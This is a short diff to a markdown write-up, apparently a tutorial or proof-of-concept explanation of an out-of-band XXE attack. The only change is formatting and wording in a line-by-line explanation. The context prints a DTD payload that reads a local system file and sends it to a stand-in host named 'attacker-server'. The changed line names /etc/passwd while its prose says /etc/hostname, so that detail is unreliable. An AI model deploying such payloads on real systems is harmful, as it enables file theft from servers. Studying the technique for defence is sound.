@@ -104,7 +104,7 @@ The `poc.dtd` file, hosted on the attacker's server, contains the actual exfiltr
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
-1. <code><!ENTITY % file SYSTEM "file:///etc/passwd"></code>: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the `/etc/hostname` file from the local server's filesystem.
+1. <b><!ENTITY % file SYSTEM "file:///etc/passwd"></b>: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the `/etc/hostname` file from the victim server's filesystem.
 
 
 
